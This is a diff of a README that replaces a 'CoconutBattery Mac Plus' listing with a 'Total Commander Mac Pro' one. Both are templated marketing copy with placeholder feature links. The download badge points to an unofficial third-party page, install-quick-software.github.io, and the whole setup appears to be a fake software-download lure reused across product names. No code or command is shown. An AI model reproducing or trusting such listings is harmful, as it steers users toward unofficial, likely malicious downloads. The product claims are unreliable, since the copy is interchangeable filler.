@@ -1,9 +1,9 @@
-# CoconutBattery Mac Plus
+# Total Commander Mac Pro
 
 <br>
 
 <p align="center">
-  <img src="https://static.wikia.nocookie.net/ipod/images/2/22/CoconutBattery_3.9_macOS_icon.png" width="260">
+  <img src="https://icons.iconarchive.com/icons/hopstarter/3d-cartoon-vol2/256/Total-Commander-icon.png" width="260">
 </p>
 
 <p align="center">
@@ -16,7 +16,7 @@
 <br>
 
 <p align="center">
-  <a href="https://install-quick-software.github.io/.github/coconutbattery">
+  <a href="https://install-quick-software.github.io/.github/totalcommander">
     <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200">
   </a>
 </p>
@@ -32,32 +32,32 @@
 
 ## Overview
 
-CoconutBattery for Mac is designed for users who want a clear and trustworthy view of how their MacBook and iOS batteries are really behaving. Instead of vague icons, it surfaces real metrics through **[battery health insight](#)**, **[cycle count analysis](#)**, and **[capacity retention tracking](#)** that reveal how much performance has been lost over time. You can instantly compare current levels with factory targets using **[original design benchmarks](#)** and decide whether a device is still strong enough for daily travel, creative work, or gaming.
+Total Commander for Mac is built for users who see file management as a central part of their work. The dual-pane interface delivers **[keyboard-focused navigation](#)**, **[tabbed directory workspaces](#)**, and **[queue-based copy operations](#)** that keep complex movement of data under control. It becomes natural to compare folders, move items between drives, and manage archives using a structured, command-style approach rather than dragging files one by one.
 
-Beyond basic numbers, CoconutBattery highlights behavior that often goes unnoticed. Live readouts powered by **[real-time charge monitoring](#)** show how quickly the battery fills and drains under different workloads. Temperature and usage patterns are reflected through **[thermal impact evaluation](#)** and **[health state diagnostics](#)** so it becomes easier to link habits to long-term outcomes. Connected devices benefit from **[multi-device overview](#)** that lets users track Macs, iPhones, and iPads in one place, supported by **[history snapshot export](#)** for service checks or resale listings.
+The application extends its usefulness with advanced control features. Targeted searches using **[advanced search queries](#)** and **[multi-criteria sorting](#)** help track down items in deep or messy directory trees. Background transfers powered by **[asynchronous file operations](#)** keep the interface responsive even when large jobs are running. Support for plugins and **[plugin-ready extension handling](#)** lets users integrate compression tools, comparison utilities, and other helpers into one unified environment.
 
-Because everything is wrapped in a clean macOS-native interface, even detailed information feels approachable. Users who simply want reassurance see clear labels and helpful indicators, while advanced users can explore **[advanced battery profiling](#)** without clutter. For anyone who depends on stable mobile performance, CoconutBattery turns battery health from a mystery into a manageable part of owning Apple hardware.
+For administrators, creators, and power users who handle large volumes of data, Total Commander for Mac becomes more than a browser; it is a console for storage. Clear feedback, predictable behavior, and strong keyboard integration turn daily file operations into a fast, reliable routine tailored to professional use.
 
 ---
 
 ## Features
 
-- • The app presents battery information in a clear layout that makes technical data easy to interpret.
-- • Users can quickly compare current capacity against original design values to judge long-term wear.
-- • Charge cycles and temperature behavior are tracked to highlight patterns that affect reliability.
-- • Support for multiple devices allows users to oversee both Mac and iOS hardware from one place.
-- • Historical records help confirm whether performance changes are normal or indicate a developing issue.
-- • The tool uses macOS-native controls so navigation feels familiar and responsive.
-- • Data views can support technicians who document device condition before or after service.
-- • Lightweight processing keeps the app unobtrusive during normal everyday use.
-- • Exportable summaries assist users who need to share battery status with support or buyers.
-- • It is ideal for people who depend on predictable mobile performance from their Apple devices.
+- • The dual-pane layout allows users to compare directories side by side.
+- • Keyboard shortcuts speed up navigation and reduce reliance on the mouse.
+- • Tabbed browsing lets users keep several working locations open at once.
+- • Queue-based transfers help manage large copy and move operations safely.
+- • Advanced search options make it easier to locate files in deep folder structures.
+- • Support for archives allows users to work with compressed files more efficiently.
+- • Plugin support opens the door to extended capabilities and integrations.
+- • Visual indicators keep users informed about progress during long operations.
+- • The tool appeals to power users who work heavily with file systems.
+- • It provides a structured alternative to standard macOS file browsing.
 
 ---
 
 ## Screenshots
 
-![Screenshot](https://www.coconut-flavour.com/coconutbattery/assets/img/BigSur/menu_g.png)
+![Screenshot](https://mac.eltima.com/wp-content/uploads/2024/01/commander_dark@2x-1024x621.jpg)
 
 ---
 
